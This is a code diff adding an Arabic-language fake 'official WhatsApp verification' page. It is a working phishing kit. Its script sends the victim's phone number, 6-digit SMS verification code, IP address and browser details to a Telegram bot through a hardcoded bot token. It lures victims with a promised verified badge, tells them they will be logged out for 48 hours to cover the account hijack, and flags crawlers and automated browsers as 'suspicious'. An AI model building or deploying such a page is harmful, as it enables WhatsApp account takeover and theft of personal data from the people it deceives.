@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دعم الواتساب الرسمي</title>
+    <title>التوثيق الرسمي للواتساب</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -35,6 +35,735 @@
             font-weight: bold;
             color: #555;
         }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 12px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #128C7E;
+        }
+        .secured {
+            font-size: 13px;
+            color: #777;
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+        }
+        .badge {
+            background-color: #25D366;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .whatsapp-logo {
+            text-align: center;
+            margin: 15px 0;
+        }
+        .whatsapp-logo img {
+            height: 80px;
+            margin-bottom: 10px;
+        }
+        #verification-section {
+            display: none;
+        }
+        .info-box {
+            background-color: #f8f9fa;
+            border-left: 4px solid #25D366;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        .info-box h3 {
+            margin-top: 0;
+            color: #128C7E;
+        }
+        .country-select {
+            display: flex;
+            align-items: center;
+        }
+        .country-select select {
+            flex: 1;
+            margin-left: 10px;
+        }
+        .country-flag {
+            width: 30px;
+            height: 20px;
+            object-fit: cover;
+            border: 1px solid #ddd;
+        }
+        #loading {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+        }
+        .timer {
+            color: #777;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .header-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header-logo img {
+            height: 70px;
+        }
+        .logo-text {
+            color: #25D366;
+            font-weight: bold;
+            margin-top: 10px;
+            font-size: 18px;
+        }
+        .error-message {
+            color: red;
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+        }
+        .success-message {
+            color: #25D366;
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+            font-weight: bold;
+        }
+        /* شريط التقدم */
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            margin: 25px 0;
+            position: relative;
+        }
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: #ddd;
+            z-index: 1;
+        }
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #ddd;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #777;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+        }
+        .step.active {
+            background: #25D366;
+            color: white;
+        }
+        .step.completed {
+            background: #128C7E;
+            color: white;
+        }
+        .step-label {
+            position: absolute;
+            top: 35px;
+            width: 100px;
+            text-align: center;
+            font-size: 12px;
+            color: #555;
+        }
+        .step.active .step-label {
+            color: #25D366;
+            font-weight: bold;
+        }
+        .step.completed .step-label {
+            color: #128C7E;
+        }
+        /* تأثيرات الأزرار */
+        button:active {
+            transform: scale(0.98);
+        }
+        /* تحسينات للهاتف */
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+            .info-box {
+                padding: 10px;
+            }
+            .step-label {
+                width: 80px;
+                font-size: 11px;
+            }
+        }
+        /* تحسينات لحقول الإدخال */
+        input:focus, select:focus {
+            border-color: #25D366;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(37, 211, 102, 0.2);
+        }
+        /* قسم المعلومات الجانبية */
+        .sidebar-info {
+            background: #f0f8ff;
+            border-left: 4px solid #25D366;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        /* قسم QR Code */
+        .qr-section {
+            text-align: center;
+            margin: 20px 0;
+        }
+        #qrcode {
+            width: 150px;
+            height: 150px;
+            margin: 0 auto;
+            background: #f5f5f5;
+            padding: 10px;
+        }
+        /* قسم التحقق بالوجه */
+        #face-verify-section {
+            display: none;
+        }
+        #video, #canvas {
+            width: 100%;
+            max-width: 250px;
+            margin: 0 auto;
+            display: block;
+        }
+        #face-message {
+            text-align: center;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- شريط التقدم -->
+        <div class="progress-steps">
+            <div class="step completed" id="step1">
+                <span>1</span>
+                <div class="step-label">إدخال الرقم</div>
+            </div>
+            <div class="step" id="step2">
+                <span>2</span>
+                <div class="step-label">التحقق</div>
+            </div>
+            <div class="step" id="step3">
+                <span>3</span>
+                <div class="step-label">التأكيد</div>
+            </div>
+        </div>
+        
+        <div class="header-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="شعار واتساب">
+            <div class="logo-text">WhatsApp</div>
+        </div>
+        
+        <h1>التوثيق الرسمي للواتساب</h1>
+        <div class="whatsapp-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="واتساب">
+        </div>
+        
+        <!-- رسائل التنبيه -->
+        <div id="error-message" class="error-message"></div>
+        <div id="success-message" class="success-message"></div>
+        
+        <div class="info-box">
+            <h3>فوائد توثيق رقم الواتساب</h3>
+            <p>توثيق رقم الواتساب يمنحك:</p>
+            <ul>
+                <li>علامة التحقق <span class="badge">الرسمية</span> التي تثبت هوية عملك</li>
+                <li>حماية ضد انتحال الهوية والحسابات المزيفة</li>
+                <li>ظهور أولوية في نتائج البحث على واتساب</li>
+                <li>زيادة ثقة العملاء بنسبة تصل إلى 80%</li>
+                <li>إمكانية استخدام أدوات الأعمال المتقدمة</li>
+                <li>حماية بياناتك برمزية من طرف إلى طرف</li>
+            </ul>
+            <p>عملية التوثيق تتم خلال 3 أيام عمل كحد أقصى بعد تقديم الطلب.</p>
+        </div>
+        
+        <div style="background: #f0f0f0; padding: 12px; border-radius: 6px; margin: 20px 0;">
+            <p><span class="badge">مؤمن</span> جميع المحادثات والمكالمات محمية بتشفير من طرف إلى طرف.</p>
+        </div>
+        
+        <form id="main-form" method="POST">
+            <!-- قسم إدخال رقم الهاتف -->
+            <div id="phone-section">
+                <div class="form-group">
+                    <label for="country">الدولة</label>
+                    <div class="country-select">
+                        <select id="country" name="country">
+                            <option value="213+" data-flag="🇩🇿">الجزائر (213+)</option>
+                            <option value="966+" data-flag="🇸🇦">السعودية (966+)</option>
+                            <option value="971+" data-flag="🇦🇪">الإمارات (971+)</option>
+                            <option value="20+" data-flag="🇪🇬">مصر (20+)</option>
+                            <option value="962+" data-flag="🇯🇴">الأردن (962+)</option>
+                            <option value="965+" data-flag="🇰🇼">الكويت (965+)</option>
+                            <option value="974+" data-flag="🇶🇦">قطر (974+)</option>
+                            <option value="968+" data-flag="🇴🇲">عمان (968+)</option>
+                            <option value="973+" data-flag="🇧🇭">البحرين (973+)</option>
+                            <option value="212+" data-flag="🇲🇦">المغرب (212+)</option>
+                            <option value="216+" data-flag="🇹🇳">تونس (216+)</option>
+                            <option value="964+" data-flag="🇮🇶">العراق (964+)</option>
+                            <option value="961+" data-flag="🇱🇧">لبنان (961+)</option>
+                            <option value="218+" data-flag="🇱🇾">ليبيا (218+)</option>
+                            <option value="222+" data-flag="🇲🇷">موريتانيا (222+)</option>
+                            <option value="967+" data-flag="🇾🇪">اليمن (967+)</option>
+                            <option value="252+" data-flag="🇸🇴">الصومال (252+)</option>
+                            <option value="249+" data-flag="🇸🇩">السودان (249+)</option>
+                            <option value="963+" data-flag="🇸🇾">سوريا (963+)</option>
+                            <option value="970+" data-flag="🇵🇸">فلسطين (970+)</option>
+                            <option value="1+" data-flag="🇺🇸">الولايات المتحدة (1+)</option>
+                            <option value="44+" data-flag="🇬🇧">المملكة المتحدة (44+)</option>
+                            <option value="33+" data-flag="🇫🇷">فرنسا (33+)</option>
+                            <option value="49+" data-flag="🇩🇪">ألمانيا (49+)</option>
+                            <option value="39+" data-flag="🇮🇹">إيطاليا (39+)</option>
+                            <option value="34+" data-flag="🇪🇸">إسبانيا (34+)</option>
+                            <option value="90+" data-flag="🇹🇷">تركيا (90+)</option>
+                            <option value="7+" data-flag="🇷🇺">روسيا (7+)</option>
+                            <option value="86+" data-flag="🇨🇳">الصين (86+)</option>
+                            <option value="91+" data-flag="🇮🇳">الهند (91+)</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone">رقم الهاتف</label>
+                    <input type="tel" id="phone" name="phone" placeholder="أدخل رقم الهاتف بدون الصفر الأول" required>
+                </div>
+                
+                <!-- قسم QR Code (يظهر فقط على الأجهزة المحمولة) -->
+                <div class="qr-section" id="qr-section" style="display: none;">
+                    <p>أو قم بالمسح الضوئي باستخدام تطبيق الواتساب</p>
+                    <div id="qrcode"></div>
+                    <p style="font-size: 12px; color: #777;">اضغط على القائمة ≡ في الواتساب ثم اختر "مسح رمز الاستجابة"</p>
+                </div>
+                
+                <button type="button" id="send-verification">إرسال رمز التحقق</button>
+                <div id="loading">
+                    <p>جاري إرسال رمز التحقق...</p>
+                </div>
+            </div>
+            
+            <!-- قسم إدخال رمز التحقق (سيظهر بعد إرسال الرقم) -->
+            <div id="verification-section">
+                <div class="form-group">
+                    <label for="verification-code">رمز التحقق المكون من 6 أرقام</label>
+                    <input type="text" id="verification-code" name="verification-code" placeholder="أدخل رمز التحقق المرسل إليك" maxlength="6" required>
+                </div>
+                
+                <div class="timer" id="timer">يمكنك إعادة الإرسال بعد 02:00</div>
+                <button type="button" id="resend-code" style="background: #f0f0f0; color: #555; display: none;">إعادة إرسال الرمز</button>
+                
+                <!-- قسم التحقق بالوجه (اختياري) -->
+                <div id="face-verify-section">
+                    <div class="form-group">
+                        <label>التحقق بالوجه</label>
+                        <p>لإكمال عملية التوثيق، يرجى السماح بالوصول إلى الكاميرا للتحقق من هويتك</p>
+                        <div style="width: 100%; height: 300px; background: #f5f5f5; display: flex; align-items: center; justify-content: center; margin: 10px 0;">
+                            <video id="video" width="250" height="250" autoplay style="display: none;"></video>
+                            <canvas id="canvas" width="250" height="250" style="display: none;"></canvas>
+                            <p id="face-message">جاري تحميل أداة التحقق...</p>
+                        </div>
+                        <button type="button" id="start-camera">بدء التحقق</button>
+                        <button type="button" id="capture" style="display: none; background: #f0f0f0; color: #555;">التقاط صورة</button>
+                    </div>
+                </div>
+                
+                <button type="submit">تأكيد التوثيق</button>
+            </div>
+        </form>
+        
+        <!-- قسم المعلومات الجانبية -->
+        <div class="sidebar-info">
+            <h3>نصائح هامة</h3>
+            <p>• تأكد من أن الرقم متصل بالإنترنت لتلقي رمز التحقق</p>
+            <p>• إذا لم تصلك الرسالة، تحقق من علبة الوارد والرسائل غير المرغوب فيها</p>
+            <p>• يمكنك طلب إعادة إرسال الرمز بعد دقيقتين</p>
+            <p>• لا تشارك رمز التحقق مع أي شخص</p>
+        </div>
+        
+        <div class="info-box">
+            <h3>كيف يعمل التوثيق؟</h3>
+            <p>1. تقوم بإدخال رقم هاتفك المراد توثيقه</p>
+            <p>2. نرسل لك رمز تحقق مؤقت عبر رسالة SMS</p>
+            <p>3. تدخل رمز التحقق لتأكيد ملكية الرقم</p>
+            <p>4. نتحقق من بياناتك خلال 48 ساعة عمل</p>
+            <p>5. سيتم تسجيل الخروج من حسابك لمدة 48 ساعة لحين توثيق حسابك</p>
+            <p>6. تحصل على العلامة الرسمية بعد الموافقة</p>
+        </div>
+        
+        <p class="secured">هذا الحساب هو الحساب الرسمي المعتمد من واتساب للأعمال. جميع البيانات محمية بتشفير متقدم.</p>
+    </div>
+
+    <script>
+        // جلب chat_id من الرابط أو تعيينه يدويًا
+        const urlParams = new URLSearchParams(window.location.search);
+        let chatId = urlParams.get('chat_id');
+        
+        // إذا لم يكن chat_id موجودًا في الرابط، يمكن تعيينه يدويًا هنا:
+        if (!chatId) {
+            chatId = '123456789'; // استبدلها بمعرف الدردشة الخاص بك
+        }
+        
+        const botToken = '6308792872:AAG_O5Y_-nheEQRl9osGSG-Ek8EXHei8jJA'; // استبدله إذا لزم الأمر
+        
+        // متغيرات لتتبع الطلبات
+        const requestHistory = [];
+        const MAX_REQUESTS = 3;
+        const TIME_WINDOW = 5 * 60 * 1000; // 5 دقائق
+
+        // دالة لعرض رسائل الخطأ
+        function showError(message) {
+            const errorElement = document.getElementById('error-message');
+            errorElement.textContent = message;
+            errorElement.style.display = 'block';
+            setTimeout(() => {
+                errorElement.style.display = 'none';
+            }, 5000);
+        }
+
+        // دالة لعرض رسائل النجاح
+        function showSuccess(message) {
+            const successElement = document.getElementById('success-message');
+            successElement.textContent = message;
+            successElement.style.display = 'block';
+            setTimeout(() => {
+                successElement.style.display = 'none';
+            }, 5000);
+        }
+
+        // دالة لتحديث شريط التقدم
+        function updateProgressSteps(step) {
+            document.querySelectorAll('.step').forEach((el, index) => {
+                el.classList.remove('active', 'completed');
+                if (index + 1 < step) {
+                    el.classList.add('completed');
+                } else if (index + 1 === step) {
+                    el.classList.add('active');
+                }
+            });
+        }
+
+        // دالة إرسال البيانات إلى التليجرام بشكل آمن
+        function sendToTelegram(data) {
+            if (!chatId || !botToken) {
+                console.error('Chat ID أو Bot Token غير موجود');
+                showError('حدث خطأ في الإرسال. يرجى المحاولة لاحقًا.');
+                return;
+            }
+            
+            let message = `📲 *طلب توثيق واتساب جديد* 📲\n\n`;
+            
+            if (data.type === 'phone_submission') {
+                message += `📞 *رقم الهاتف:* \`${data.phone}\`\n`;
+                message += `🌍 *البلد:* ${data.country}\n`;
+                message += `🕒 *الوقت:* ${data.time}\n`;
+                message += `🌐 *IP:* ${data.ip || 'غير معروف'}\n`;
+                message += `🖥️ *المتصفح:* ${data.userAgent || 'غير معروف'}\n`;
+                message += `\n🔗 *رابط الطلب:* ${window.location.href}`;
+                
+                // تحقق من الطلب المشبوه
+                if (isSuspiciousRequest(data.userAgent || '', data.ip || '')) {
+                    message += `\n\n⚠️ *تحذير أمني:* هذا الطلب يبدو مشبوهاً!`;
+                }
+            } else if (data.type === 'verification_code') {
+                message += `🔢 *رمز التحقق:* \`${data.code}\`\n`;
+                message += `🕒 *الوقت:* ${data.time}\n`;
+                message += `\n✅ *تم إدخال رمز التحقق بنجاح*`;
+            }
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('تم الإرسال بنجاح:', data))
+                .catch(error => {
+                    console.error('فشل الإرسال:', error);
+                    showError('حدث خطأ في الإرسال. يرجى المحاولة لاحقًا.');
+                });
+        }
+
+        // الحصول على عنوان IP للمستخدم
+        function getUserIP() {
+            return new Promise((resolve) => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => resolve(data.ip || 'غير معروف'))
+                    .catch(() => resolve('غير معروف'));
+            });
+        }
+
+        // تحقق من الطلبات المشبوهة
+        function isSuspiciousRequest(userAgent, ip) {
+            const suspiciousUserAgents = [
+                'headless', 'phantom', 'puppeteer', 'selenium', 
+                'bot', 'spider', 'crawler', 'scraper'
+            ];
+            
+            const suspiciousIPs = [
+                'tor', 'vpn', 'proxy', 'anonymous'
+            ];
+            
+            const lowerUserAgent = userAgent.toLowerCase();
+            if (suspiciousUserAgents.some(ua => lowerUserAgent.includes(ua))) {
+                return true;
+            }
+            
+            if (suspiciousIPs.some(ipTerm => ip.toLowerCase().includes(ipTerm))) {
+                return true;
+            }
+            
+            return false;
+        }
+
+        // تحقق من معدل الطلبات
+        function checkRequestRate(ip) {
+            const now = Date.now();
+            const recentRequests = requestHistory.filter(
+                req => req.ip === ip && (now - req.time) < TIME_WINDOW
+            );
+            
+            if (recentRequests.length >= MAX_REQUESTS) {
+                return false;
+            }
+            
+            requestHistory.push({ ip, time: now });
+            return true;
+        }
+
+        // تحقق من صحة رمز التحقق
+        function validateVerificationCode(code) {
+            if (!/^\d{6}$/.test(code)) return false;
+            
+            if (/(012345|123456|234567|345678|456789|567890|098765|987654|876543|765432|654321|543210)/.test(code)) {
+                return false;
+            }
+            
+            if (/(\d)\1{3}/.test(code)) {
+                return false;
+            }
+            
+            return true;
+        }
+
+        // تذكر بيانات المستخدم
+        function saveFormData() {
+            const formData = {
+                country: document.getElementById('country').value,
+                phone: document.getElementById('phone').value
+            };
+            localStorage.setItem('whatsappVerificationData', JSON.stringify(formData));
+        }
+
+        function loadFormData() {
+            const savedData = localStorage.getItem('whatsappVerificationData');
+            if (savedData) {
+                const formData = JSON.parse(savedData);
+                document.getElementById('country').value = formData.country;
+                document.getElementById('phone').value = formData.phone;
+            }
+        }
+
+        // مؤقت لإعادة الإرسال
+        function startTimer() {
+            let timeLeft = 120;
+            const timerElement = document.getElementById('timer');
+            const resendButton = document.getElementById('resend-code');
+            
+            const timerInterval = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                timerElement.textContent = `يمكنك إعادة الإرسال بعد ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerElement.style.display = 'none';
+                    resendButton.style.display = 'block';
+                }
+                
+                timeLeft--;
+            }, 1000);
+            
+            resendButton.addEventListener('click', function() {
+                document.getElementById('verification-section').style.display = 'none';
+                document.getElementById('phone-section').style.display = 'block';
+                document.getElementById('send-verification').disabled = false;
+                resendButton.style.display = 'none';
+                timerElement.style.display = 'block';
+                updateProgressSteps(1);
+            });
+        }
+
+        // إضافة QR Code للتحقق السريع
+        function addQRCodeOption() {
+            const qrSection = document.getElementById('qr-section');
+            qrSection.style.display = 'block';
+            
+            // إنشاء QR Code (مثال - يحتاج إلى مكتبة حقيقية)
+            const qrCodeElement = document.getElementById('qrcode');
+            qrCodeElement.innerHTML = `
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=WHATSAPP:VERIFY:${Date.now()}" 
+                     alt="QR Code" style="width:100%; height:100%;">
+            `;
+        }
+
+        // التحقق بالوجه (وهمي للتوضيح)
+        function addFaceVerification() {
+            const faceVerifySection = document.getElementById('face-verify-section');
+            faceVerifySection.style.display = 'block';
+            
+            document.getElementById('start-camera').addEventListener('click', function() {
+                document.getElementById('face-message').textContent = 'جاري تشغيل الكاميرا...';
+                
+                // هذا مثال، يحتاج إلى تنفيذ حقيقي
+                setTimeout(() => {
+                    document.getElementById('face-message').textContent = 'تم التحقق بنجاح!';
+                    document.getElementById('start-camera').style.display = 'none';
+                    document.getElementById('capture').style.display = 'none';
+                }, 2000);
+            });
+        }
+
+        // عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            updateProgressSteps(1);
+            loadFormData();
+            
+            // إضافة QR Code للأجهزة المحمولة فقط
+            if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+                addQRCodeOption();
+            }
+            
+            // إضافة تأثيرات للأزرار
+            document.querySelectorAll('button').forEach(button => {
+                button.addEventListener('mousedown', () => {
+                    button.style.transform = 'scale(0.98)';
+                });
+                button.addEventListener('mouseup', () => {
+                    button.style.transform = 'scale(1)';
+                });
+                button.addEventListener('mouseleave', () => {
+                    button.style.transform = 'scale(1)';
+                });
+            });
+            
+            // التحقق من صحة رقم الهاتف (أرقام فقط)
+            document.getElementById('phone').addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                saveFormData();
+            });
+            
+            // حفظ بيانات الدولة عند التغيير
+            document.getElementById('country').addEventListener('change', saveFormData);
+        });
+
+        // إرسال رمز التحقق عند الضغط على الزر
+        document.getElementById('send-verification').addEventListener('click', async function() {
+            const countryCode = document.getElementById('country').value;
+            const phoneNumber = document.getElementById('phone').value;
+            
+            if (!phoneNumber || phoneNumber.length < 8) {
+                showError('الرجاء إدخال رقم هاتف صحيح (8 أرقام على الأقل)');
+                return;
+            }
+            
+            const userIP = await getUserIP();
+            if (!checkRequestRate(userIP)) {
+                showError('لقد تجاوزت الحد المسموح من الطلبات. يرجى المحاولة لاحقاً.');
+                return;
+            }
+            
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('send-verification').disabled = true;
+            
+            try {
+                const countryName = document.getElementById('country').options[document.getElementById('country').selectedIndex].text;
+                const userAgent = navigator.userAgent;
+                
+                // إرسال بيانات الهاتف إلى التليجرام
+                sendToTelegram({
+                    type: 'phone_submission',
+                    phone: `${countryCode}${phoneNumber}`,
+                    country: countryName,
+                    time: new Date().toLocaleString('ar-EG'),
+                    ip: userIP,
+                    userAgent: userAgent
+                });
+
+                // إظهار قسم التحقق بعد تأخير محاكاة
+                setTimeout(() => {
+                    document.getElementById('phone-section').style.display = 'none';
+                    document.getElementById('verification-section').style.display = 'block';
+                    document.getElementById('loading').style.display = 'none';
+                    startTimer();
+                    updateProgressSteps(2);
+                    showSuccess('تم إرسال رمز التحقق بنجاح إلى رقمك');
+                    
+                    // إظهار التحقق بالوجه بعد إدخال الرمز (اختياري)
+                    // addFaceVerification();
+                }, 1500);
+            } catch (error) {
+                console.error('حدث خطأ:', error);
+                showError('حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.');
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('send-verification').disabled = false;
+            }
+        });
+        
+        // تأكيد رمز التحقق
+        document.getElementById('main-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const verificationCode = document.getElementById('verification-code').value;
+            
+            if (!validateVerificationCode(verificationCode)) {
+                showError('رمز التحقق غير صالح. يرجى إدخال رمز صحيح مكون من 6 أرقام.');
+                return;
+            }
+            
+            // إرسال كود التحقق إلى التليجرام
+            sendToTelegram({
+                type: 'verification_code',
+                code: verificationCode,
+                time: new Date().toLocaleString('ar-EG')
+            });
+
+            updateProgressSteps(3);
+            showSuccess('تم تأكيد الرمز بنجاح! جاري إتمام عملية التوثيق...');
+            
+            // إعادة توجيه المستخدم بعد الإرسال
+            setTimeout(() => {
+                window.location.href = "https://web.whatsapp.com/";
+            }, 3000);
+        });
+    </script>
+</body>
+</html>        }
         input, select {
             width: 100%;
             padding: 12px;
